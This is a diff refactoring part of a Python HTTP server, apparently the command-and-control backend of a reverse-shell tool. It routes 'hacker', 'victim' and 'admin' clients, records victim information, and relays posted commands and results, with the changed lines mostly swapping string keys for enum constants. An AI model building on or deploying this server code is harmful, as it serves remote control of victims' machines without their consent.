@@ -35,12 +35,21 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         self.server_command_functions: dict[
             str, list[HTTPMethod | Callable[..., Any]]
         ] = {
-            "post_cmd": [self.handle_cmd_post_cmd, HTTPMethod.POST],
-            "verify": [self.handle_cmd_verify, HTTPMethod.POST],
-            "create_session": [self.handle_cmd_create_session, HTTPMethod.POST],
-            "post_res": [self.handle_cmd_post_res, HTTPMethod.GET],
-            "fetch_cmd": [lambda: (False, HTTPStatus.NOT_IMPLEMENTED), HTTPMethod.GET],
-            "fetch_res": [lambda: (False, HTTPStatus.NOT_IMPLEMENTED), HTTPMethod.GET],
+            ut.ServerCommands.post_cmd: [self.handle_cmd_post_cmd, HTTPMethod.POST],
+            ut.ServerCommands.register: [self.handle_cmd_verify, HTTPMethod.POST],
+            ut.ServerCommands.create_session: [
+                self.handle_cmd_create_session,
+                HTTPMethod.POST,
+            ],
+            ut.ServerCommands.post_res: [self.handle_cmd_post_res, HTTPMethod.GET],
+            ut.ServerCommands.fetch_cmd: [
+                lambda: (False, HTTPStatus.NOT_IMPLEMENTED),
+                HTTPMethod.GET,
+            ],
+            ut.ServerCommands.fetch_res: [
+                lambda: (False, HTTPStatus.NOT_IMPLEMENTED),
+                HTTPMethod.GET,
+            ],
         }
 
         # Initializing our parent, cuz of respect.
@@ -103,9 +112,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         result = [
             client_type
             for client_type in [
-                ut.ClientType.Hacker,
-                ut.ClientType.Victim,
-                ut.ClientType.Admin,
+                ut.ClientType.hacker,
+                ut.ClientType.victim,
+                ut.ClientType.admin,
             ]
             if usr_client_type == client_type.__str__()
         ]
@@ -203,7 +212,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If the client is a victim then we will require more data from the body and
         # add it to the victim_info database.
-        if client_type.__str__() == ut.ClientType.Victim.__str__():
+        if client_type.__str__() == ut.ClientType.victim.__str__():
             # Let us insert the victim_info in the database after checking if the req_body isn't None
             if req_body is None:
                 return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
@@ -287,7 +296,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Let's check if the victim is valid by using the self.get_client_type function
         valid_victim = (
             victim_type := self.get_client_type_from_db(victim_id)
-        ) is not None and victim_type == ut.ClientType.Victim
+        ) is not None and victim_type == ut.ClientType.victim
 
         # If the victim is invalid, send a bad request for the user
         if not valid_victim:
@@ -327,11 +336,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         admin_token = self.get_header_token("admin-token")
 
         legit_user: dict[str, bool] = {
-            ut.ClientType.Hacker.__str__(): hacker_token is not None
+            ut.ClientType.hacker.__str__(): hacker_token is not None
             and hacker_token == self.config.hacker_token,
-            ut.ClientType.Admin.__str__(): admin_token is not None
+            ut.ClientType.admin.__str__(): admin_token is not None
             and admin_token == self.config.admin_token,
-            ut.ClientType.Victim.__str__(): True,
+            ut.ClientType.victim.__str__(): True,
         }
 
         if get_client_type_from_headers:
@@ -352,6 +361,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # Ok so first let's get the client-type from the database and
             # use that to check if the user can access the path it's accessing
             client_type = self.get_client_type_from_db(client_id)
+            print(client_type)
 
             # Check if the client has needed tokens for it's type
             has_tokens = legit_user[client_type.__str__()]
@@ -454,7 +464,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             client_id,
             command,
             handler,
-            get_client_type_from_headers=(True if command == "verify" else False),
+            get_client_type_from_headers=(True if command == ut.ServerCommands.register else False),
         )
 
     def do_GET(self):
